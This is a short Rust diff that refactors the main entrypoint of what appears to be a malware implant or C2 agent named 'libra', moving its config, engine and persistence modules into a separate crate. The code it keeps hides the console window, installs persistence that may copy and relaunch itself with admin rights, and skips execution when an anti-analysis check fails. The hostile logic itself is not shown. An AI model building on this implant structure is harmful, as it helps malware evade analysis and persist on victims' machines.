@@ -1,9 +1,5 @@
 #![cfg_attr(feature = "desktop", windows_subsystem = "windows")]
 
-mod config;
-mod engine;
-mod persistence;
-
 use std::env;
 
 fn main() {
@@ -18,7 +14,7 @@ fn main() {
     let enable_persistence = injected.as_ref().map(|i| i.enable_persistence).unwrap_or(false);
 
     // Apply persistence early (may relaunch/copy and exit)
-    persistence::PersistenceManager::apply(require_admin, copy_to_path, enable_persistence);
+    libra_engine::persistence::PersistenceManager::apply(require_admin, copy_to_path, enable_persistence);
 
     // Anti-analysis check
     if !libra_modules::anti_analysis::should_execute() {
@@ -26,7 +22,7 @@ fn main() {
     }
 
     // Load config from injected + CLI args
-    let cfg = config::ConfigManager::load(&args, injected);
+    let cfg = libra_engine::config::ConfigManager::load(&args, injected);
 
     // Build tokio runtime and run the engine
     let rt = match tokio::runtime::Runtime::new() {
@@ -38,7 +34,7 @@ fn main() {
     };
 
     rt.block_on(async {
-        let mut engine = engine::AgentEngine::new(cfg);
+        let mut engine = libra_engine::engine::AgentEngine::new(cfg);
         match engine.run().await {
             Ok(()) => {}
             Err(e) => eprintln!("[!] Agent error: {}", e),
